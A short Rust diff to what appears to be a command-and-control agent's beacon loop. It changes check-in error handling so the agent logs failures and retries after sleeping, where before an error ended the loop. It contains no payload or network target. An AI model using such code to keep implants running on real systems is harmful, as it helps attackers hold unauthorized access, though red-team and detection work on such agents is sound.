@@ -42,8 +42,16 @@ impl PhantomAgent {
             let delay = Duration::from_millis(self.compute_sleep_delay());
             let mode = self.config.sleep_mode;
             let _ = tokio::task::spawn_blocking(move || blocking_sleep(delay, mode)).await;
-            if self.checkin().await? {
-                break;
+            match self.checkin().await {
+                Ok(true) => break,
+                Ok(false) => {}
+                Err(e) => {
+                    warn!(
+                        agent_id = format_args!("0x{:08X}", self.agent_id),
+                        error = %e,
+                        "checkin failed, will retry"
+                    );
+                }
             }
         }
 
